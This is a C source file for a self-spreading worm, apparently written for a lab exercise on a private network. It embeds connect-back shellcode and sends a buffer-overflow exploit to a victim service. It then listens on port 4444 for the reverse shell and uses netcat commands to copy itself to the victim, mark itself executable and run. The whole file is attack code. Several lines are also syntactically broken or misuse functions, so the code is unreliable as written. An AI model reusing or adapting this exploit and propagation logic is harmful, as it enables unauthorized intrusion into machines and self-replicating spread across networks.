#include <stdlib.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>


#include <netinet/in.h>
#define BUF_SIZE 1064

#define BUFFER_SIZE 1024
#define NAME_SIZE 2048

char shellcode[] =
     "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\x41\x42\x43\x44\x66\x68\xb0"
        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";


//standard offset (probably must be modified)

#define RET 0xffcbbf29

int check_success()
{
    char* p;
    p = (char*)getenv("SUCCESS");
    if ((p != NULL)&&(int)p[0]=='Y')
    {
        return 1;
    }
    return 0;
}

int exploit(char* victimIP, unsigned short vic_port, char* conback_host, unsigned short conback_port)
{
    char buffer[1064];
    int s, i, size, j;
    struct sockaddr_in remote;
    //Modify the connectback ip address and port. ip of client .133
    shellcode[33] = 192;
    shellcode[34] = 168;
    shellcode[35] = 120;
    shellcode[36] = 133;

    shellcode[39] = 17;
    shellcode[40] = 92;

    //CREATE EXPLOIT
    //
    memset(buffer, 0x90, BUF_SIZE);
    memcpy(buffer + 901 - sizeof(shellcode), shellcode, sizeof(shellcode));
    buffer[900] = 0x90;
    for (i = 905; i < BUF_SIZE - 4; i += 4)
    {
        *((int*)&buffer[i]) = RET;
    }
    buffer[BUF_SIZE - 1] = 0x0;
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
    {
        fprintf(stderr, "Error: Socket\n");
        return -1;
    }
    //state Protocolfamily , then converting the hostname or IP address, and getting  port number
    remote.sin_family = AF_INET;
    inet_aton(victimIP, &remote.sin_addr.s_addr);
    remote.sin_port = htons(vic_port);

    //connect with des host
    if (connect(s, (struct sockaddr*)&remote, sizeof(remote)) == -1)
    {
        close(s);
        fprintf(stderr, "error : Connect\n");
        return 0;
    }
    for (i = 0; i < 10; i++)
    {
        for (j = 905; j < BUF_SIZE - 4; j += 4)
        {
            *((int*)&buffer[j]) = RET;
        }
        buffer[BUF_SIZE - 1] = 0x0;
    }
    //sending exploit string
    size = send(s, buffer, sizeof(buffer), 0);
    if (size == -1)
    {
        close(s);
        fprintf(stderr, "SENDING DATA FAILED \n");
        return -1;
    }
    //check if the attack success
    sleep(5);

    if (check_success())
    {
        putenv("SUCCESS=N");
        close(s);
        return 1;
    }
    else
    {
        printf("exploit failed ! \n");
    }
    struct  hostnec hep;
    struct in_addr my_ip;
    //getting hostname
    if (gethostbyname(myname, sizeof(myname)) == NULL)
    {
        printf("Get hostname failed !");
        exit(1);
    }
    if ((hep = gethostbyname(myname)) == NULL)
    {
        printf("get host by name failed \n");
        exit(2);
    }
    printf("The ip addr is %s", hep->addr);
    memcpy(&my_ip, hep->h_addr, hep->h_length);
    return (char*)inet_ntoa(my_ip);
}


// thuc hien lay lan qua may server  va khoi chay no 
void* propagation()
{
    int s, c, cli_size;
    struct sockaddr_in srv, cli;
    char buffer[BUFFER_SIZE]
        int bytes;
    int i;
    printf("LAY NHIEM TIMEEEEEEEEEE !!!!!!!!!!");
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == -1)
    {
        perror("socket()  FAILED !");

    }
    srv.sin_addr.s_addr = INADDR_ANY;
    srv.sin_port = htons(4444);
    srv.sin_family = AF_INET;
    if (bind(s, (struct sockaddr*)&srv, sizeof(srv)) == -1)
    {
        perror("bind()  failed !")
            return;
    }
    if (listen(s, 3) == -1)
    {
        perror("listen()  failed !")
            return;
    }
    c = accept(s, (struct sockaddr*)&cli, &cli_size);
    if (c == -1)
    {
        perror("accpet()  failed !")
            return;
    }
    printf("got it ... connect back from victim !")
        putenv("SUCCESS = Y ");

    /// <summary>
    memcpy(buffer, "pwd"\x0A",4);
        bytes = send(c, buffer, 4, 0);
    if (bytes == -1)
        return;
    bytes = recv(c, buffer, sizeof(buffer), 0);
    if (bytes == -1)
        return;
    buffer[bytes - 1] = 0;
    printf("Server running at : %s\n", (char*)inet_ntoa(cli.sin_addr.s_addr), buffer);
          
   
    /// </summary>
    /// <returns></returns>
    

	// After Server connect back to port 4444 of client , simpleworm'll open port 10k on server and write data to file simpleworm 
    memcpy(buffer, "nc -l 10000 >simpleworm\x0A", 24);
    bytes = send(c, buffer, 24, 0);

    printf("Worm is MOVING to the victim !");
    // netcat to server through port 10k and transfer simpleworm to it  
    system("nc 192.168.120.132 10000 <simpleworm");

	// give file "simpleworm" permission 
    memcpy(buffer, "chmod + simpleworm\x0A", 20);
    bytes = send(c, buffer, 20, 0);
	// run it on server
    memcpy(buffer, "./simpleworm\x0A", 13);
    bytes = send(c, buffer, 14, 0);
    if (bytes == -1)
        return;
    close(c);

}



int main(int argc, char* argv[])
{
    pthread_t thread1;
    int iret;
    char conback_ip[16];
    unsigned short conback_port = 4444, victim_port = 5000;

    iret = pthread_create(&thread1, NULL, propagation, NULL);


    for (;;)
    {
        char vic_addr[] = "192.168.120.132";
        printf("ATTACKING  ... \n", vic_addr);
        strcpy(conback_ip, gethostipaddress());
        putenv("SUCCESS la ro !");
        if (exploit(vic_addr, victim_port, "192.168.120.133", conback_port))
        {
            printf("ATTACKED !");
            pthread_join(thread1, NULL);
            iret = pthread_create(&thread1, NULL, propagation, NULL);

        }
        getchar();
    }

}
